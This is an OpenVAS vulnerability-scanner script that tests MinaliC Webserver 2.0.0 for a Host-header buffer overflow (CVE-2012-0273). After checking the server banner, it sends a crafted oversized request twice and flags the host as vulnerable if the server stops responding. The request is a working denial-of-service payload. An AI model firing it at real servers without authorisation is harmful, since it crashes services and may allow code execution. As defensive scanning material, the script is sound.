###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_minalic_web_server_bof_vuln.nasl 11401 2018-09-15 08:45:50Z cfischer $
#
# MinaliC Host Header Handling Remote Buffer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803192");
  script_version("$Revision: 11401 $");
  script_cve_id("CVE-2012-0273");
  script_bugtraq_id(52873);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-04-16 13:14:39 +0530 (Tue, 16 Apr 2013)");
  script_name("MinaliC Host Header Handling Remote Buffer Overflow Vulnerability");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/24958/");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/121296/");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("minaliC/banner");

  script_tag(name:"impact", value:"Successful exploitation will let the remote unauthenticated
  attackers to cause a buffer overflow, resulting in a denial of service or
  potentially allowing the execution of arbitrary code.");
  script_tag(name:"affected", value:"MinaliC Webserver version 2.0.0");
  script_tag(name:"insight", value:"The issue is due to user-supplied input is not properly
  validated when handling a specially crafted host header in the request.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running MinaliC Webserver and is prone to buffer
  overflow vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:8080);

banner = get_http_banner(port: port);
if("Server: MinaliC" >!< banner){
  exit(0);
}

## Cross Confirm the application
res = http_get_cache(item:"/", port:port);
if("Server: MinaliC" >!< res) {
  exit(0);
}

junk = crap(data:"0x41", length:245) + "[.|";
host = crap(data:"0x90", length:61);

req = string("GET ", junk , " HTTP/1.1\r\n",
             "Host: ", host, "\r\n\r\n");

## Send crafted data to server
res = http_send_recv(port:port, data:req);
res = http_send_recv(port:port, data:req);

## server is died and it's vulnerable
req = http_get(item:"/", port:port);
res = http_keepalive_send_recv(port:port, data:req);
if("Server: MinaliC" >!< res) {
  security_message(port:port);
  exit(0);
}

exit(99);
